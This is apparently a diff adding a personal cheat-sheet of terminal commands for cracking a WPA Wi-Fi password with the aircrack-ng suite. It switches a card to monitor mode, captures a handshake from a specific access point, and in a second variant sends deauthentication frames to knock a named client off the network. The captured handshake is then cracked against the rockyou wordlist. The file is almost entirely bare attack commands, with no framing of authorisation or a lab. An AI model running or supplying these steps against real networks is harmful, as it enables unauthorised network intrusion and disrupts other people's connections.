@@ -1,1 +1,51 @@
 
+sudo su
+
+airmon-ng check kill  
+
+iwconfig
+
+iwconfig wlan0 mode monitor
+
+iwconfig 
+
+airodump-ng wlan0  
+
+ctrl c
+
+airodump-ng -c 11 --bssid 2E:47:BA:7A:0B:FF -w psk wlan0  
+
+wpa handshake
+
+ls
+
+locate rockyou.txt
+
+ aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 2E:47:BA:7A:0B:FF pak-01.cap 
+ 
+ aircrack-ng  realme-01.cap -w /usr/share/wordlists/rockyou.txt -b 2E:47:BA:7A:0B:FF 
+
+ 
+
+                              OR
+
+
+ sudo su  
+ 
+ airmon-ng start wlan0   
+ 
+  airodump-ng wlan0  
+  
+  ctrl c
+  
+  airodump-ng -c 11 -w realme --bssid 2E:47:BA:7A:0B:FF wlan0
+
+new tabe
+
+aireplay-ng --deauth 20 -a 2E:47:BA:7A:0B:FF -c AE:A0:31:BC:A4:31 wlan0
+
+ls
+
+aircrack-ng  realme-01.cap -w /usr/share/wordlists/rockyou.txt -b 2E:47:BA:7A:0B:FF
+
+
